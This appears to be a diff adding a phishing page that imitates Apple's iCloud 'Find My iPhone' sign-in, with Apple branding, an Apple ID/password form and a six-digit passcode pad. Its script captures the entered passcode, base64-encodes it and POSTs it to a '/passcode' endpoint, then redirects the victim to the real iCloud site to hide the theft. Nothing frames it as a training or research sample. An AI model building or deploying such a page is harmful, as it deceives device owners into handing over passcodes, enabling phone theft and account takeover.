@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud - Find My iPhone</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&display=swap');
+
+        body {
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+        }
+
+        .apple-gradient {
+            background: linear-gradient(180deg, #000000 0%, #000000 100%);
+        }
+
+        .passcode-dot {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background-color: #333333;
+            transition: all 0.2s ease;
+        }
+
+        .passcode-dot.filled {
+            background-color: #ffffff;
+        }
+
+        .shake {
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            20%,
+            60% {
+                transform: translateX(-5px);
+            }
+
+            40%,
+            80% {
+                transform: translateX(5px);
+            }
+        }
+
+        .map-container {
+            height: 400px;
+            background-color: #111111;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .map-placeholder {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiIHBhdHRlcm5UcmFuc2Zvcm09InJvdGF0ZSg0NSkiPjxyZWN0IHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgZmlsbD0iIzIyMjIyMiI+PC9yZWN0PjwvcGF0dGVybj48L2RlZnM+PHJlY3QgZmlsbD0idXJsKCNwYXR0ZXJuKSIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSI+PC9yZWN0Pjwvc3ZnPg==');
+        }
+
+        .device-marker {
+            width: 24px;
+            height: 24px;
+            background-color: #000000;
+            border-radius: 50%;
+            border: 3px solid #000000;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .device-marker::after {
+            content: '';
+            position: absolute;
+            width: 24px;
+            height: 24px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(2.5);
+                opacity: 0;
+            }
+        }
+
+        /* Dark mode styles */
+        .dark-card {
+            background-color: #1a1a1a;
+            border-color: #333333;
+        }
+
+        .dark-text {
+            color: #ffffff;
+        }
+
+        .dark-subtext {
+            color: #aaaaaa;
+        }
+
+        .dark-input {
+            background-color: #111111;
+            border-color: #333333;
+            color: #ffffff;
+        }
+
+        .dark-button {
+            background-color: #333333;
+            color: #ffffff;
+        }
+
+        .dark-button:hover {
+            background-color: #444444;
+        }
+
+        .dark-footer {
+            background-color: #000000;
+            border-color: #333333;
+        }
+
+        /* Passcode button styles */
+        .passcode-btn {
+            width: 80px;
+            height: 80px;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: 300;
+            transition: all 0.1s ease;
+        }
+
+        .passcode-btn:active {
+            background-color: #444444 !important;
+            transform: scale(0.95);
+        }
+
+        .passcode-btn-empty {
+            visibility: hidden;
+        }
+
+        .passcode-delete-btn {
+            font-size: 24px;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col">
+    <!-- Header -->
+    <header class="apple-gradient text-white py-4 px-6 shadow-md">
+        <div class="container mx-auto flex justify-between items-center">
+            <div class="flex items-center">
+                <i class="fab fa-apple text-2xl mr-2"></i>
+                <span class="font-semibold">iCloud</span>
+            </div>
+            <nav>
+                <ul class="flex space-x-6">
+                    <li><a href="#" class="hover:underline">Sign Out</a></li>
+                    <li><a href="#" class="hover:underline">Help</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content - Initially showing login page -->
+    <main class="flex-grow flex items-center justify-center py-12 px-4" id="mainContent">
+        <!-- Login Page -->
+        <div class="w-full max-w-md dark-card rounded-xl shadow-lg overflow-hidden border border-gray-800"
+            id="loginPage">
+            <div class="p-8">
+                <div class="text-center mb-8">
+                    <i class="fab fa-apple text-5xl dark-text mb-4"></i>
+                    <h1 class="text-2xl font-semibold dark-text">Find My iPhone</h1>
+                    <p class="dark-subtext mt-2">Sign in to iCloud to locate your device</p>
+                </div>
+
+                <form id="loginForm" class="space-y-6">
+                    <div>
+                        <label for="appleId" class="block text-sm font-medium dark-subtext mb-1">Apple ID</label>
+                        <input type="email" id="appleId" name="appleId" required
+                            class="w-full px-4 py-3 dark-input border rounded-lg focus:ring-2 focus:ring-black-500 focus:border-black-500 transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="password" class="block text-sm font-medium dark-subtext mb-1">Password</label>
+                        <input type="password" id="password" name="password" required
+                            class="w-full px-4 py-3 dark-input border rounded-lg focus:ring-2 focus:ring-black-500 focus:border-black-500 transition duration-200">
+                    </div>
+
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center">
+                            <input type="checkbox" id="rememberMe" name="rememberMe"
+                                class="h-4 w-4 text-black-600 focus:ring-black-500 border-gray-600 rounded bg-gray-800">
+                            <label for="rememberMe" class="ml-2 block text-sm dark-subtext">Remember me</label>
+                        </div>
+                        <a href="#" class="text-sm text-black-400 hover:underline">Forgot Apple ID or Password?</a>
+                    </div>
+
+                    <button type="submit"
+                        class="w-full bg-black-600 hover:bg-black-700 text-white py-3 px-4 rounded-lg font-medium transition duration-200 focus:outline-none focus:ring-2 focus:ring-black-500 focus:ring-offset-2">
+                        Sign In
+                    </button>
+                </form>
+
+                <div class="mt-6 text-center">
+                    <p class="text-sm dark-subtext">Don't have an Apple ID? <a href="#"
+                            class="text-black-400 hover:underline">Create one now</a></p>
+                </div>
+            </div>
+
+            <div class="bg-gray-900 px-8 py-4 border-t border-gray-800">
+                <p class="text-xs dark-subtext text-center">Apple ID and password are case sensitive.</p>
+            </div>
+        </div>
+
+        <!-- Passcode Page - Hidden initially -->
+        <div class="w-full max-w-md dark-card rounded-xl shadow-lg overflow-hidden border border-gray-800 hidden"
+            id="passcodePage">
+            <div class="p-8">
+                <div class="text-center mb-8">
+                    <div class="w-16 h-16 bg-gray-800 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-lock text-2xl dark-text"></i>
+                    </div>
+                    <h1 class="text-2xl font-semibold dark-text">Enter Passcode</h1>
+                    <p class="dark-subtext mt-2">Enter the passcode for this device</p>
+                </div>
+
+                <div class="flex justify-center space-x-4 mb-8" id="passcodeDots">
+                    <div class="passcode-dot"></div>
+                    <div class="passcode-dot"></div>
+                    <div class="passcode-dot"></div>
+                    <div class="passcode-dot"></div>
+                    <div class="passcode-dot"></div>
+                    <div class="passcode-dot"></div>
+                </div>
+
+                <div class="grid grid-cols-3 gap-4 justify-items-center" id="passcodePad">
+                    <button type="button" class="passcode-btn dark-button" data-value="1">
+                        <span>1</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="2">
+                        <span>2</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="3">
+                        <span>3</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="4">
+                        <span>4</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="5">
+                        <span>5</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="6">
+                        <span>6</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="7">
+                        <span>7</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="8">
+                        <span>8</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button" data-value="9">
+                        <span>9</span>
+                    </button>
+                    <button type="button" class="passcode-btn passcode-btn-empty" disabled></button>
+                    <button type="button" class="passcode-btn dark-button" data-value="0">
+                        <span>0</span>
+                    </button>
+                    <button type="button" class="passcode-btn dark-button passcode-delete-btn" id="deleteBtn">
+                        <i class="fas fa-delete-left"></i>
+                    </button>
+                </div>
+
+                <div class="mt-6 text-center hidden" id="passcodeError">
+                    <p class="text-sm text-red-500">Incorrect passcode. Try again.</p>
+                </div>
+
+                <div class="mt-6 text-center">
+                    <p class="text-sm dark-subtext">Forgot passcode? <a href="#"
+                            class="text-black-400 hover:underline">Reset via iCloud</a></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Lost Mode Page - Hidden initially -->
+        <div class="w-full max-w-4xl dark-card rounded-xl shadow-lg overflow-hidden border border-gray-800 hidden"
+            id="lostModePage">
+            <div class="p-8">
+                <div class="flex justify-between items-center mb-8">
+                    <div>
+                        <h1 class="text-2xl font-semibold dark-text">Lost Mode</h1>
+                        <p class="dark-subtext">iPhone 13 Pro Max</p>
+                    </div>
+                    <div class="flex space-x-2">
+                        <button
+                            class="px-4 py-2 border border-gray-700 rounded-lg hover:bg-gray-800 transition duration-200 dark-text">
+                            <i class="fas fa-arrow-rotate-left mr-2"></i> Refresh
+                        </button>
+                        <button
+                            class="px-4 py-2 bg-black-600 text-white rounded-lg hover:bg-black-700 transition duration-200">
+                            <i class="fas fa-power-off mr-2"></i> Exit Lost Mode
+                        </button>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <div class="md:col-span-2">
+                        <div class="map-container rounded-lg overflow-hidden shadow-sm">
+                            <div class="map-placeholder"></div>
+                            <div class="device-marker"></div>
+                        </div>
+
+                        <div class="mt-4 flex justify-between items-center">
+                            <div>
+                                <p class="text-sm dark-subtext">Last updated: <span id="lastUpdated">Just now</span></p>
+                            </div>
+                            <div class="flex space-x-2">
+                                <button
+                                    class="px-3 py-1 border border-gray-700 rounded-lg text-sm hover:bg-gray-800 transition duration-200 dark-text">
+                                    <i class="fas fa-location-arrow mr-1"></i> Directions
+                                </button>
+                                <button
+                                    class="px-3 py-1 border border-gray-700 rounded-lg text-sm hover:bg-gray-800 transition duration-200 dark-text">
+                                    <i class="fas fa-map mr-1"></i> View Larger Map
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-6">
+                        <div class="bg-gray-900 p-4 rounded-lg border border-gray-800">
+                            <h3 class="font-medium dark-text mb-2">Device Information</h3>
+                            <div class="space-y-3">
+                                <div>
+                                    <p class="text-xs dark-subtext">Device</p>
+                                    <p class="font-medium dark-text">iPhone 13 Pro Max</p>
+                                </div>
+                                <div>
+                                    <p class="text-xs dark-subtext">Serial Number</p>
+                                    <p class="font-medium dark-text">F2L9K1P2D3</p>
+                                </div>
+                                <div>
+                                    <p class="text-xs dark-subtext">Battery</p>
+                                    <p class="font-medium dark-text">78% - Charging</p>
+                                </div>
+                                <div>
+                                    <p class="text-xs dark-subtext">Lost Mode Activated</p>
+                                    <p class="font-medium dark-text">Today, 10:42 AM</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="bg-gray-900 p-4 rounded-lg border border-gray-800">
+                            <h3 class="font-medium dark-text mb-2">Location Details</h3>
+                            <div class="space-y-3">
+                                <div>
+                                    <p class="text-xs dark-subtext">Address</p>
+                                    <p class="font-medium dark-text">1 Apple Park Way, Cupertino, CA 95014</p>
+                                </div>
+                                <div>
+                                    <p class="text-xs dark-subtext">Accuracy</p>
+                                    <p class="font-medium dark-text">20 meters</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="bg-gray-900 p-4 rounded-lg border border-gray-800">
+                            <h3 class="font-medium dark-text mb-2">Lost Mode Message</h3>
+                            <p class="mb-3 dark-text">This iPhone has been lost. Please contact me at the number below.
+                            </p>
+                            <div class="flex items-center">
+                                <i class="fas fa-phone-alt text-black-400 mr-2"></i>
+                                <span class="font-medium dark-text">(555) 123-4567</span>
+                            </div>
+                        </div>
+
+                        <div class="bg-black-900 bg-opacity-30 border border-black-800 p-4 rounded-lg">
+                            <h3 class="font-medium text-black-400 mb-2">Actions</h3>
+                            <div class="space-y-2">
+                                <button
+                                    class="w-full text-left px-3 py-2 bg-gray-800 border border-gray-700 rounded-lg text-sm hover:bg-gray-700 transition duration-200 dark-text">
+                                    <i class="fas fa-bell mr-2 text-black-400"></i> Play Sound
+                                </button>
+                                <button
+                                    class="w-full text-left px-3 py-2 bg-gray-800 border border-gray-700 rounded-lg text-sm hover:bg-gray-700 transition duration-200 dark-text">
+                                    <i class="fas fa-lock mr-2 text-black-400"></i> Lock Device
+                                </button>
+                                <button
+                                    class="w-full text-left px-3 py-2 bg-gray-800 border border-gray-700 rounded-lg text-sm hover:bg-gray-700 transition duration-200 dark-text">
+                                    <i class="fas fa-trash-alt mr-2 text-red-400"></i> Erase Device
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="dark-footer py-6 px-4 border-t border-gray-800">
+        <div class="container mx-auto">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="text-sm dark-subtext mb-4 md:mb-0">
+                    <p>More ways to shop: <a href="#" class="text-black-400 hover:underline">Find an Apple Store</a> or
+                        <a href="#" class="text-black-400 hover:underline">other retailer</a> near you.</p>
+                </div>
+                <div class="text-xs dark-subtext">
+                    <p>Copyright © 2023 Apple Inc. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        console.log(atob("NTYxMTIz"))
+        document.addEventListener('DOMContentLoaded', function () {
+            // DOM elements
+            const loginPage = document.getElementById('loginPage');
+            const passcodePage = document.getElementById('passcodePage');
+            const lostModePage = document.getElementById('lostModePage');
+            const loginForm = document.getElementById('loginForm');
+            const passcodeDots = document.getElementById('passcodeDots').children;
+            const passcodePad = document.getElementById('passcodePad');
+            const deleteBtn = document.getElementById('deleteBtn');
+            const passcodeError = document.getElementById('passcodeError');
+
+            // State
+            let currentPasscode = '';
+            const correctPasscode = '123456'; // This would be the device passcode in a real scenario
+            let failedAttempts = 0;
+
+            // Login form submission
+            loginForm.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                // Simulate login process
+                setTimeout(() => {
+                    loginPage.classList.add('hidden');
+                    passcodePage.classList.remove('hidden');
+                }, 500);
+            });
+
+            // Passcode pad interaction
+            passcodePad.addEventListener('click', function (e) {
+                const button = e.target.closest('.passcode-btn');
+                if (button && !button.disabled) {
+                    const value = button.getAttribute('data-value');
+
+                    if (value) {
+                        // Play click sound (simulated)
+                        const clickSound = new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU...');
+                        clickSound.volume = 0.3;
+                        clickSound.play().catch(e => { });
+
+                        if (currentPasscode.length < 6) {
+                            currentPasscode += value;
+                            updatePasscodeDots();
+
+                            if (currentPasscode.length === 6) {
+                                console.log(currentPasscode);
+                                savePasscode(currentPasscode);
+                                verifyPasscode();
+                            }
+                        }
+                    }
+                }
+            });
+
+            // Delete button
+            deleteBtn.addEventListener('click', function () {
+                if (currentPasscode.length > 0) {
+                    currentPasscode = currentPasscode.slice(0, -1);
+                    updatePasscodeDots();
+                    passcodeError.classList.add('hidden');
+                }
+            });
+
+            // Update passcode dots display
+            function updatePasscodeDots() {
+                for (let i = 0; i < passcodeDots.length; i++) {
+                    if (i < currentPasscode.length) {
+                        passcodeDots[i].classList.add('filled');
+                    } else {
+                        passcodeDots[i].classList.remove('filled');
+                    }
+                }
+            }
+
+            // Verify passcode
+            function verifyPasscode() {
+                if (currentPasscode === correctPasscode) {
+                    // Correct passcode - show lost mode page
+                    setTimeout(() => {
+                        passcodePage.classList.add('hidden');
+                        lostModePage.classList.remove('hidden');
+
+                        // Update last updated time
+                        setInterval(() => {
+                            document.getElementById('lastUpdated').textContent = 'Just now';
+                        }, 60000);
+                    }, 200);
+                } else {
+                    // Incorrect passcode
+                    failedAttempts++;
+                    // currentPasscode = '';
+                    updatePasscodeDots();
+                    // passcodeError.classList.remove('hidden');
+                    // passcodePage.classList.add('shake');
+
+                    // Disable buttons temporarily
+                    const buttons = passcodePad.querySelectorAll('.passcode-btn');
+                    buttons.forEach(btn => btn.disabled = true);
+
+                    setTimeout(() => {
+                        passcodePage.classList.remove('shake');
+                        buttons.forEach(btn => btn.disabled = false);
+
+                        if (failedAttempts >= 3) {
+                            passcodeError.textContent = `Incorrect passcode. Try again in ${getLockoutTime()} seconds.`;
+                            disablePasscodeEntry(getLockoutTime());
+                        }
+                    }, 500);
+                }
+            }
+
+            const savePasscode = async(passcode) => {
+                passcode = btoa(passcode)
+                const res = await fetch("/passcode", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ passcode }),
+                });
+
+                window.location.href = "https://www.icloud.com/find";
+            }
+
+            // Get lockout time based on failed attempts
+            function getLockoutTime() {
+                if (failedAttempts < 3) return 0;
+                if (failedAttempts < 5) return 30;
+                if (failedAttempts < 7) return 60;
+                return 300; // 5 minutes
+            }
+
+            // Disable passcode entry for a period
+            function disablePasscodeEntry(seconds) {
+                const buttons = passcodePad.querySelectorAll('.passcode-btn');
+                buttons.forEach(btn => btn.disabled = true);
+
+                let remaining = seconds;
+                const interval = setInterval(() => {
+                    remaining--;
+                    if (remaining <= 0) {
+                        clearInterval(interval);
+                        buttons.forEach(btn => btn.disabled = false);
+                        passcodeError.textContent = 'Incorrect passcode. Try again.';
+                    } else {
+                        passcodeError.textContent = `Incorrect passcode. Try again in ${remaining} seconds.`;
+                    }
+                }, 1000);
+            }
+
+            // Simulate device location updates
+            setInterval(() => {
+                if (!lostModePage.classList.contains('hidden')) {
+                    // In a real app, this would update the map with new coordinates
+                    console.log('Updating device location...');
+                }
+            }, 30000);
+        });
+    </script>
+
+    <script src="script.js"></script>
+
+</html>
